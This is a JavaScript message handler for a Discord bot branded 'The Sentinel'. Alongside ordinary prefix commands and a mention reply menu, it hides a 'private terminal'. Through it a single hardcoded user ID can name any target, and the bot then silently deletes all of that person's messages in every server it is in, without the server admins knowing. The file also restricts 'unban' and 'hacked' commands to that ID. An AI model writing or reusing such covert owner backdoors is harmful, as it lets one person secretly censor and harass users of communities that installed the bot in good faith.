const { EmbedBuilder, ActionRowBuilder, StringSelectMenuBuilder } = require('discord.js');

const processedMessages = new Set();
// Memory variables for your private terminal
let livePurgeMode = 0;
let liveHackedUser = '';

module.exports = {
  name: 'messageCreate',
  async execute(message, client) {
    const myID = '1014550997072347137';

    // 1. AUTO-PURGE EXECUTION (Runs everywhere)
    if (livePurgeMode === 1 && message.author.id === liveHackedUser) {
        try {
            if (message.deletable) {
                await message.delete();
                return; 
            }
        } catch (err) {}
    }

    // 2. DM PROTECTION: If it's a DM and NOT you, ignore it.
    if (!message.guild && message.author.id !== myID) return;

    // 3. PRIVATE TERMINAL (Only works for you, ideally in DMs)
    if (message.author.id === myID) {
        const input = message.content.toLowerCase();
        if (input.startsWith('target ')) {
            liveHackedUser = input.replace('target ', '').trim();
            livePurgeMode = 1;
            return message.reply(`🎯 **Sentinel Control:** Purging ID \`${liveHackedUser}\`.`);
        }
        if (input === 'stop') {
            livePurgeMode = 0;
            return message.reply('✅ **Sentinel Control:** Purge disabled.');
        }
    }

    // 4. Standard Bot Logic (Deduplication)
    if (processedMessages.has(message.id)) return;
    processedMessages.add(message.id);
    setTimeout(() => processedMessages.delete(message.id), 3000);

    // 5. Handle Prefix Commands
    if (message.content.startsWith(client.prefix)) {
      const args = message.content.slice(client.prefix.length).trim().split(/ +/);
      const commandName = args.shift().toLowerCase();
      const command = client.commands.get(commandName);

      if (command) {
        // If it's a restricted command, only let you run it
        const restrictedCommands = ['unban', 'hacked']; 
        if (restrictedCommands.includes(commandName) && message.author.id !== myID) {
            return message.reply("❌ You do not have permission to use this command.");
        }

        try {
          await command.execute(message, args, client);
        } catch (error) {
          console.error(`Error:`, error);
        }
        return; 
      }
    }

    // 6. Handle Mentions & Replies (Publicly visible in servers)
    const isMentioned = message.mentions.has(client.user.id);
    const isReplyToBot = message.reference && 
                         (await message.channel.messages.fetch(message.reference.messageId).catch(() => null))?.author.id === client.user.id;

    if (isMentioned || isReplyToBot) {
      const isOwner = message.author.id === myID;
      
      const replyEmbed = new EmbedBuilder()
        .setColor(0x010101)
        .setTitle(`[ BFX STOCKS SERVICES ]`)
        .setThumbnail(client.user.displayAvatarURL())
        .setDescription(
          `🌟 **${isOwner ? 'Welcome back, Master.' : 'Sentinel Protocol Active.'}**\n\n` +
          `> **System Prefix:** \`${client.prefix}\`\n` +
          `> **Guard Status:** \`${client.autoModEnabled ? '🟢 ONLINE' : '🔴 OFFLINE'}\`\n` +
          `> **Version:** \`v2.0-STABLE\`\n\n` +
          `*Select an option below to interact with the system.*`
        )
        .setFooter({ text: 'Powered by The Sentinel™', iconURL: client.user.displayAvatarURL() });

      const menu = new ActionRowBuilder()
        .addComponents(
          new StringSelectMenuBuilder()
            .setCustomId('help_menu')
            .setPlaceholder('Start With The Sentinel')
            .addOptions([
              { label: 'Help', description: 'Show commands', value: 'show_help', emoji: '📋' },
              { label: 'Developer', description: 'View the team', value: 'show_dev', emoji: '🛡️' }
            ]),
        );

      await message.reply({ embeds: [replyEmbed], components: [menu] }).catch(() => null);
    }
  },
};
